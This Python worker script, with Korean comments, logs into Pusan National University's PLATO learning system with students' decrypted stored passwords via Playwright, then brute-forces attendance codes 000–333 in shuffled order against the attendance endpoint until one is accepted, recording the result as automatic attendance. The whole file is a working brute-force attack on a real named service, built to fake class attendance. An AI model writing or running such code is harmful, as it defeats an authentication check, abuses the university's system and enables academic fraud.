import sys
import os
import argparse

# 필요시 backend 폴더를 path에 추가
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from sqlalchemy import update
from sqlalchemy.orm import sessionmaker
from database import engine
from models.user import User
from models.lecture import Lecture
from models.attendance import Attendance
from models.user_lecture_map import user_lecture
from utils.auth_helper import decrypt
from playwright.async_api import async_playwright
import requests
import random
import logging
import datetime
from runners.plato_cookie import load_cookies_if_exist, save_cookies
from bs4 import BeautifulSoup
from sqlalchemy.exc import IntegrityError

SessionLocal = sessionmaker(bind=engine)

LOG_DIR = os.path.join(os.path.dirname(__file__), "logs")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_PATH = os.path.join(LOG_DIR, "auto_attendance_worker_part1.log")

########################################################
# 유틸 함수들
########################################################

def already_attended_today(db, user_id, lecture_id):
    """
    KST 기준으로 오늘(0시~24시) 범위 안에 이미 출석 기록이 있는지 확인
    """
    KST = datetime.timezone(datetime.timedelta(hours=9))
    now_kst = datetime.datetime.now(KST)
    start_of_day_kst = now_kst.replace(hour=0, minute=0, second=0, microsecond=0)
    end_of_day_kst = start_of_day_kst + datetime.timedelta(days=1)

    start_of_day_utc = start_of_day_kst.astimezone(datetime.timezone.utc)
    end_of_day_utc = end_of_day_kst.astimezone(datetime.timezone.utc)

    attendance = db.query(Attendance).filter(
        Attendance.user_id == user_id,
        Attendance.lecture_id == lecture_id,
        Attendance.timestamp >= start_of_day_utc,
        Attendance.timestamp < end_of_day_utc
    ).first()

    return attendance

async def extract_requests_session_from_context(context):
    """browser context 쿠키를 requests.Session에 옮기는 함수."""
    session = requests.Session()
    cookies = await context.cookies()
    for cookie in cookies:
        session.cookies.set(cookie["name"], cookie["value"], domain=cookie.get("domain"))
    return session

async def get_form_data(session, course_id):
    """autoattendance.php에서 필요한 form_data를 파싱."""
    url = f"https://plato.pusan.ac.kr/local/ubattendance/autoattendance.php?id={course_id}"
    res = session.get(url)
    soup = BeautifulSoup(res.text, "html.parser")
    return {
        "type": soup.find("input", {"name": "type"})["value"],
        "id": soup.find("input", {"name": "id"})["value"],
        "autoid": soup.find("input", {"name": "autoid"})["value"],
        "sesskey": soup.find("input", {"name": "sesskey"})["value"]
    }

async def get_plato_session(p, user):
    """주어진 user로 PLATO 로그인 -> (browser, context) 반환."""
    student_id = user.student_id
    student_pw = decrypt(user.student_password_encrypted)
    logging.info(f"[get_plato_session] 유저={user.id}, student_id={student_id}")

    browser = await p.chromium.launch(headless=True)
    try:
        # (1) 쿠키 기반 로그인 시도
        context = await load_cookies_if_exist(browser, student_id)
        if context:
            logging.debug("[쿠키 기반 로그인 시도]")
            page = await context.new_page()
            await page.goto("https://plato.pusan.ac.kr/login.php")
            await page.wait_for_load_state("networkidle")
            logout_button = await page.query_selector('button[title=""]:has-text("로그아웃")')
            if logout_button:
                logging.info("[쿠키 로그인 성공]")
                await page.close()
                return browser, context
            await page.close()

        # (2) 수동 로그인 시도
        logging.info("[수동 로그인 시도]")
        context = await browser.new_context()
        page = await context.new_page()
        await page.goto("https://plato.pusan.ac.kr/login.php")
        await page.fill('input[name="username"]', student_id)
        await page.fill('input[name="password"]', student_pw)
        await page.click('[name="loginbutton"]')
        await page.wait_for_load_state("networkidle")

        # 로그인 실패 판별
        if "login.php" in page.url or await page.query_selector("div.loginerrors"):
            await page.close()
            raise Exception("로그인 실패")

        # 쿠키 저장
        await save_cookies(context, student_id)
        logging.info("[수동 로그인 성공, 쿠키 저장]")
        await page.close()
        return browser, context

    except Exception as e:
        logging.error(f"[get_plato_session] 로그인 실패, 유저={user.id}, 오류={str(e)}")
        await browser.close()
        raise

########################################################
# 메인 출석 시도 로직
########################################################

async def run_auto_attendance_for_user_lecture(user_id, lecture_id):
    db = SessionLocal()
    try:
        user = db.query(User).filter_by(id=user_id).first()
        lecture = db.query(Lecture).filter_by(id=lecture_id).first()

        if not user or not lecture:
            logging.error(f"[worker_part1] 잘못된 user_id={user_id} 또는 lecture_id={lecture_id}")
            return

        # 이미 오늘(UTC 기준 변환 후) 출석 있다면 스킵
        already = already_attended_today(db, user.id, lecture.id)
        if already:
            logging.info(f"[worker_part1] 이미 출석됨 user={user.id}, lecture={lecture.id}")
            return

        # Playwright로 브루트포스 (000~333)
        from playwright.async_api import async_playwright
        async with async_playwright() as p:
            try:
                browser, context = await get_plato_session(p, user)
                attendance_url = (
                    f"https://plato.pusan.ac.kr/local/ubattendance/my_status.php?id={lecture.plato_course_id}"
                )
                page = await context.new_page()
                await page.goto(attendance_url)
                await page.wait_for_load_state("networkidle")

                if "autoattendance.php" not in page.url:
                    logging.info(f"[worker_part1] 현재 출석 가능 상태 아님, url={page.url}")
                    await page.close()
                    await browser.close()
                    return

                session_req = await extract_requests_session_from_context(context)
                await page.close()

                # 파트1 범위
                codes = list(range(0, 334))  # 0 ~ 333
                random.shuffle(codes)
                headers = {
                    "Referer": f"https://plato.pusan.ac.kr/local/ubattendance/autoattendance.php?id={lecture.plato_course_id}"
                }

                for code in codes:
                    try:
                        form_data = await get_form_data(session_req, lecture.plato_course_id)
                        form_data["authkey"] = f"{code:03d}"

                        res = session_req.post(
                            "https://plato.pusan.ac.kr/local/ubattendance/user_action.php",
                            data=form_data,
                            headers=headers,
                            allow_redirects=True
                        )

                        # 인증 성공 => url 이 my_status.php 로 이동
                        if "my_status.php" in res.url:
                            # 혹시 다른 Worker가 먼저 성공했는지 중복 확인
                            already2 = already_attended_today(db, user.id, lecture.id)
                            if already2:
                                logging.info(f"[worker_part1] 동시에 출석완료됨 user={user.id}, lecture={lecture.id}")
                                return

                            new_att = Attendance(
                                user_id=user.id,
                                lecture_id=lecture.id,
                                type=2,  # 자동(브루트포스)
                                auth_code=code
                            )
                            db.add(new_att)
                            try:
                                db.commit()
                            except IntegrityError as e:
                                db.rollback()
                                logging.warning(
                                    f"[worker_part1] 중복 출석 IntegrityError user={user.id}, lec={lecture.id}, code={code}"
                                )
                                return
                            logging.info(
                                f"[worker_part1] 자동 출석 성공 user={user.id}, lecture={lecture.id}, code={code:03d}"
                            )
                            return  # 성공 시 함수 종료

                    except Exception as e:
                        logging.warning(f"[worker_part1] 브루트포스 시도 실패 code={code:03d}, err={str(e)}")

                # 만약 모든 코드 실패
                logging.warning(f"[worker_part1] 모든 코드 실패 user={user.id}, lecture={lecture.id}")
                await browser.close()

            except Exception as e:
                logging.error(f"[worker_part1] Playwright 작업 실패 user={user_id}, lec={lecture_id}, {str(e)}")

    finally:
        # 🔑 Worker 끝나면 in_progress=False로
        stmt = (
            update(user_lecture).
            where(
                (user_lecture.c.user_id == user_id) &
                (user_lecture.c.lecture_id == lecture_id)
            ).
            values(attendance_in_progress=False)
        )
        db.execute(stmt)
        db.commit()
        db.close()

########################################################
# 메인 함수
########################################################
def main():
    os.makedirs(LOG_DIR, exist_ok=True)
    logging.basicConfig(
        level=logging.DEBUG,
        format="%(asctime)s [%(levelname)s] %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
        handlers=[
            logging.FileHandler(LOG_PATH, encoding="utf-8"),
            logging.StreamHandler()
        ]
    )

    parser = argparse.ArgumentParser()
    parser.add_argument("--user_id", type=int, required=True)
    parser.add_argument("--lecture_id", type=int, required=True)
    args = parser.parse_args()

    logging.info(f"[worker_part1 main] Start: user_id={args.user_id}, lecture_id={args.lecture_id}")

    import asyncio
    asyncio.run(run_auto_attendance_for_user_lecture(args.user_id, args.lecture_id))

    logging.info("[worker_part1 main] Done.")

if __name__ == "__main__":
    main()